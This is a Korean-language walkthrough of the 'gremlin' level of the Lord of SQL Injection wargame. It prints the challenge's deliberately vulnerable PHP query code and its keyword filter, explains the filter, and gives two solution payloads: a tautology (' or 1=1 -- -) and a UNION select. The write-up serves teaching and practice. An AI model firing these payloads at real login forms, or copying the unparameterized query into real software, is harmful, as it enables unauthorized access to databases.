# Lord of SQL Injection No.1 - gremlin

## 문제 출제 의도

기본적인 SQL Injection을 통해 SQL문을 조작할 수 있는지 확인한다.

## 소스 코드 분석

gremlin 문제의 php 소스 코드는 다음과 같다.
```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```
-----

```php
  include "./config.php";
  login_chk();
  dbconnect();
```
* config.php 파일을 불러와 적용시킨다. config.php 내부에 login_chk(), dbconnect(), solve() 등 문제 풀이 환경과 관련된 함수가 선언되어 있을 것으로 추정할 수 있다.

* login_chk() 함수는 로그인 된 상태인지 확인하는 기능을 할 것으로 추정할 수 있다.

* dbconnect() 함수는 데이터베이스에 연결하는 기능을 할 것으로 추정할 수 있다.

## include
* php의 include에 대해 잘 모르겠다면 다음 링크를 참고하자.

* [PHP: include - Manual](http://php.net/manual/kr/function.include.php)

-----

```php
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
```
* GET방식으로 id와 pw를 받으며, id나 pw에 `prob`, `_`, `.`, `()` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.

## preg_match
```php
int preg_match ( string $pattern , string $subject [, array &$matches [, int $flags [, int $offset ]]] )
```
* preg_match 함수는 문자열에서 정규표현식 매치를 수행한다.

* 반환값은 매치된 횟수이며, 0 또는 1 이다. 이는 처음 매치 후 검색을 중지하기 때문이다.

* 따라서 `preg_match('/prob|_|\.|\(\)/i', $_GET[id])` 는 `$_GET[id]`에서 정규표현식 `'/prob|_|\.|\(\)/i'` 을 매치한다.

* 즉, `if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");` 이 문장을 통해 `$_GET[id]`에 `prob`, `_`, `.`, `()` 중 하나라도 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.

* php의 preg_match 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.
    * [PHP: preg_match - Manual](http://php.net/manual/kr/function.preg-match.php)

## 정규 표현식 (Regular Expression)
* 정규 표현식은 특정한 규칙을 가진 문자열의 집합을 표현하는 데 사용하는 형식 언어이다.

* 정규 표현식에 대해 잘 모르겠다면 다음 링크를 참고하자.
    * [정규 표현식 - 위키백과](https://ko.wikipedia.org/wiki/%EC%A0%95%EA%B7%9C_%ED%91%9C%ED%98%84%EC%8B%9D)
    * [정규 표현식 테스트 사이트 RegExr](http://regexr.com/)

-----

```php
$query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
echo "<hr>query : <strong>{$query}</strong><hr><br>";
$result = @mysql_fetch_array(mysql_query($query));
if($result['id']) solve("gremlin");
```
* 받은 id와 pw가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.

* 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 id에 "0"을 제외한 어떤 문자열이든 들어있음'이다.

-----

## Solution
    
1. WHERE 조건절 무력화

    GET 방식으로 정보를 전송하기 위해 다음과 같이 URL의 맨 끝에 쿼리 스트링을 붙인다.

    ```
    http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=' or 1=1 -- -
    ```

    ```sql
    select id from prob_gremlin where id='' or 1=1 -- -' and pw=''
    ```

    이는 WHERE 조건절을 항상 참으로 만들어 prob_gremlin 테이블의 모든 행의 id 열을 불러오도록 하므로 문제가 풀린다.

2. UNION 구문 이용

    ```
    http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=' union select 'a'-- -
    ```
    ```sql
    select id from prob_gremlin where id='' union select 'a'-- -' and pw=''
    ```

    이는 결국 $result['id']에 'a'가 들어가도록 하므로 문제가 풀린다.